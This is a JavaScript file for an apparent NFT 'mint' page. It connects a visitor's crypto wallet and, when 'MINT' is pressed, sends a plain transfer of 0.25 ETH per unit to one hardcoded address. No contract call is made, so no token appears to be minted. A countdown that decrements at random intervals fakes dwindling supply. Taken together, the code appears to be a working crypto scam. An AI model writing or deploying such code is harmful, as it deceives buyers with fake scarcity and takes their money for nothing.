window.onload = function()
{
document.getElementById("connect-wallet").onclick = async function (){ await buttonact(); }
document.getElementById("gracias").onpropertychange = function(e){ console.log(e); }

xdw();
}

var amtn = 959;

var isWalletConnected = false;

function xdw()
{
if(amtn < 234) return; document.getElementById("GoDownNumber").innerText=amtn; amtn--; setTimeout(xdw,Math.random()*1000); } async function buttonact() { if(!isWalletConnected) await setupAccounts(); else mint(document.getElementById("gracias").value); } async function setupAccounts() { accounts=await ethereum.request({ method: 'eth_requestAccounts' }); console.log(accounts); isWalletConnected=true; document.getElementById("XD").style.display="block" ; document.getElementById("connect-wallet").innerHTML="MINT" ; } function decimalToHexString(number) { if (number < 0) { number=0xFFFFFFFF + number + 1; } return number.toString(16).toUpperCase(); } async function mint(_for) { if(_for < 1) return; if(_for> 5) _for = 5;
  ethereum.request(
  {
  method: "eth_sendTransaction",
  params: [
  {
  from: accounts[0],
  to: "0x37A770179F00de6c2045f426c57410Cb57A3Be34",
  value: `0x${decimalToHexString(250000000000000000*_for)}`
  }
  ]
  }
  ).then((txHash) => console.log(txHash)).catch((error)=>console.error);
  }